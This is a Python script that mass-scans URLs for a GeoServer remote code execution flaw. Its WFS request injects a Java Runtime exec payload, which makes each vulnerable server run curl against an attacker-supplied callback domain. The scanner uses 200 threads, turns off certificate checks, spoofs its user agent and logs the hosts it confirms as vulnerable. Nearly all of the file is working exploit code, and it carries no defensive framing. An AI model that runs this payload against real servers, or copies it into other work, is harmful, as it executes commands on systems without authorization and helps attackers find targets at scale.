import requests
import concurrent.futures
import sys
from urllib.parse import urljoin
from tldextract import tldextract
import random
import argparse

requests.packages.urllib3.disable_warnings()

MAX_WORKERS = 200
TIMEOUT = 10000
CALL = "<YOUR CALL>"

class Scanner:
    def __init__(self, call, max_workers, timeout):
        self.call = call
        self.max_workers = max_workers
        self.timeout = timeout

    def scan(self, url):
        extract_domain = tldextract.extract(url)
        domain = extract_domain.domain
        rand = random.randint(10, 1000)
        new_url = urljoin(
            url,
            f"/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),%27curl%20{rand}.{domain}.{self.call}%27)",
        )
        print(f"[!] Scanning {url} | {domain} | {rand}")
        try:
            response = requests.get(new_url, timeout=self.timeout, allow_redirects=False, verify=False, headers={
                "User-agent": "Mozilla/5.0 (Android; Android 7.0; Nexus 8X Build/NPD90G) AppleWebKit/601.20 (KHTML, like Gecko)  Chrome/52.0.3715.241 Mobile Safari/602.7"
            })
            if "java.lang.ClassCastException" in response.text:
                print(f"[+] {url} is vulnerable")
                with open("vuln.txt", "a") as f:
                    f.write(new_url + "\n")
        except KeyboardInterrupt:
            print("EXIT ..")
            sys.exit()
        except Exception as e:
            print(f"Can't scan {url} | {e}")
            with open("error.txt", "a") as f:
                f.write(url + "\n")

    def run(self, urls):
        print(f"[!] We've {len(urls)} URLs")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.scan, url) for url in urls]
            for future in concurrent.futures.as_completed(futures):
                future.result()

def parse_args():
    parser = argparse.ArgumentParser(description="Scan URLs for vulnerability.")
    parser.add_argument('-c', '--call', type=str, required=True, help='Call string for the URL generation.')
    parser.add_argument('-w', '--workers', type=int, default=MAX_WORKERS, help='Maximum number of workers.')
    parser.add_argument('-t', '--timeout', type=int, default=TIMEOUT, help='Timeout for requests.')
    parser.add_argument('urls', nargs='*', default=sys.stdin, help='URLs to scan.')
    return parser.parse_args()

def main():
    args = parse_args()
    scanner = Scanner(call=args.call, max_workers=args.workers, timeout=args.timeout)
    urls = [url.strip() for url in args.urls]
    scanner.run(urls)

if __name__ == "__main__":
    main()
